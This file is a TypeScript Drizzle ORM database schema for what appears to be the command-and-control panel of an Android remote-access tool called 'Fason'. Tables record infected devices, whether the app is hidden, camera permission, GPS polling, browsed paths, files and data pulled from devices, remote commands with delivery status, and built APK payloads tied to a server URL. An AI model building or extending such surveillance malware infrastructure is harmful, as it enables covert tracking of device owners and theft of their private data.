import { pgTable, text, integer, boolean, timestamp, serial, customType, uniqueIndex } from 'drizzle-orm/pg-core';
const bytea = customType<{ data: Buffer; driverData: string }>({ dataType() { return 'bytea'; } });

export const user = pgTable('user', {
  id: text('id').primaryKey(),
  email: text('email').notNull().unique(),
  emailVerified: boolean('email_verified').notNull().default(false),
  name: text('name').notNull(),
  image: text('image'),
  createdAt: timestamp('created_at', { mode: 'date' }).notNull().$defaultFn(() => new Date()),
  updatedAt: timestamp('updated_at', { mode: 'date' }).notNull().$defaultFn(() => new Date()),
  role: text('role').notNull().default('user'),
  banned: boolean('banned').default(false),
  banReason: text('ban_reason'),
  banExpires: timestamp('ban_expires', { mode: 'date' }),
  username: text('username').notNull().default(''),
  permissions: text('permissions').notNull().default('[]'),
  isDefault: integer('is_default').default(0),
  lastLogin: timestamp('last_login', { mode: 'date' }),
  deviceSecret: text('device_secret'),
});
export const session = pgTable('session', {
  id: text('id').primaryKey(),
  userId: text('user_id').notNull().references(() => user.id, { onDelete: 'cascade' }),
  expiresAt: timestamp('expires_at', { mode: 'date' }).notNull(),
  token: text('token').notNull().unique(),
  ipAddress: text('ip_address'),
  userAgent: text('user_agent'),
  createdAt: timestamp('created_at', { mode: 'date' }).notNull().$defaultFn(() => new Date()),
  updatedAt: timestamp('updated_at', { mode: 'date' }).notNull().$defaultFn(() => new Date()),
  impersonatedBy: text('impersonated_by'),
});
export const account = pgTable('account', {
  id: text('id').primaryKey(),
  providerId: text('provider_id').notNull(),
  accountId: text('account_id').notNull(),
  userId: text('user_id').notNull().references(() => user.id, { onDelete: 'cascade' }),
  accessToken: text('access_token'),
  refreshToken: text('refresh_token'),
  idToken: text('id_token'),
  accessTokenExpiresAt: timestamp('access_token_expires_at', { mode: 'date' }),
  refreshTokenExpiresAt: timestamp('refresh_token_expires_at', { mode: 'date' }),
  scope: text('scope'),
  password: text('password'),
  createdAt: timestamp('created_at', { mode: 'date' }).notNull().$defaultFn(() => new Date()),
  updatedAt: timestamp('updated_at', { mode: 'date' }).notNull().$defaultFn(() => new Date()),
});
export const verification = pgTable('verification', {
  id: text('id').primaryKey(),
  value: text('value').notNull(),
  expiresAt: timestamp('expires_at', { mode: 'date' }).notNull(),
  identifier: text('identifier').notNull(),
  createdAt: timestamp('created_at', { mode: 'date' }).notNull().$defaultFn(() => new Date()),
  updatedAt: timestamp('updated_at', { mode: 'date' }).notNull().$defaultFn(() => new Date()),
});
export const clients = pgTable('clients', {
  id: text('id').primaryKey(),
  ownerId: text('owner_id'),
  ip: text('ip').default(''),
  country: text('country'),
  city: text('city'),
  timezone: text('timezone'),
  firstSeen: text('first_seen').$defaultFn(() => new Date().toISOString()),
  lastSeen: text('last_seen').$defaultFn(() => new Date().toISOString()),
  online: boolean('online').default(false),
  reconnectCount: integer('reconnect_count').default(0),
  deviceModel: text('device_model'),
  deviceBrand: text('device_brand'),
  deviceVersion: text('device_version'),
  fasonHidden: boolean('fason_hidden').default(false),
  cameraPermission: boolean('camera_permission').default(false),
  currentPath: text('current_path').default(''),
  gpsInterval: integer('gps_interval').default(0),
  deviceInfo: text('device_info'),
});
export const clientData = pgTable('client_data', {
  id: serial('id').primaryKey(),
  clientId: text('client_id').notNull().references(() => clients.id, { onDelete: 'cascade' }),
  dataType: text('data_type').notNull(),
  data: text('data').default('[]'),
  updatedAt: text('updated_at').$defaultFn(() => new Date().toISOString()),
}, (table) => [
  uniqueIndex('idx_client_data_unique').on(table.clientId, table.dataType),
]);
export const clientFiles = pgTable('client_files', {
  id: serial('id').primaryKey(),
  clientId: text('client_id').notNull().references(() => clients.id, { onDelete: 'cascade' }),
  fileType: text('file_type').notNull(),
  originalName: text('original_name').notNull(),
  mimeType: text('mime_type'),
  data: bytea('data').notNull(),
  fileSize: integer('file_size').default(0),
  createdAt: text('created_at').$defaultFn(() => new Date().toISOString()),
});
export const logs = pgTable('logs', {
  id: serial('id').primaryKey(),
  type: text('type').notNull().default('INFO'),
  category: text('category').notNull().default('SYSTEM'),
  message: text('message').notNull(),
  details: text('details'),
  createdAt: text('created_at').$defaultFn(() => new Date().toISOString()),
});
export const buildRecords = pgTable('build_records', {
  id: serial('id').primaryKey(),
  userId: text('user_id'),
  serverUrl: text('server_url').notNull(),
  homePageUrl: text('home_page_url').notNull(),
  appName: text('app_name').notNull().default('Fason'),
  status: text('status', { enum: ['completed', 'failed'] }).default('completed'),
  apkData: bytea('apk_data'),
  fileSize: integer('file_size').default(0),
  createdAt: text('created_at').$defaultFn(() => new Date().toISOString()),
  completedAt: text('completed_at'),
});
export const settings = pgTable('settings', {
  key: text('key').primaryKey(),
  value: text('value').notNull(),
  updatedAt: text('updated_at').$defaultFn(() => new Date().toISOString()),
});
export const loginAttempts = pgTable('login_attempts', {
  id: serial('id').primaryKey(),
  ip: text('ip').notNull(),
  identifier: text('identifier').notNull().default(''),
  attemptedAt: text('attempted_at').notNull().$defaultFn(() => new Date().toISOString()),
});
export const commands = pgTable('commands', {
  id: text('id').primaryKey(),
  clientId: text('client_id').notNull().references(() => clients.id, { onDelete: 'cascade' }),
  cmdType: text('cmd_type').notNull(),
  params: text('params').default('{}'),
  status: text('status', { enum: ['sent', 'delivered', 'responded', 'failed'] }).notNull().default('sent'),
  sentAt: text('sent_at').notNull().$defaultFn(() => new Date().toISOString()),
  deliveredAt: text('delivered_at'),
  respondedAt: text('responded_at'),
  responseSummary: text('response_summary'),
});
export const jwtSecret = pgTable('jwt_secret', {
  id: integer('id').primaryKey(),
  secret: text('secret').notNull(),
});
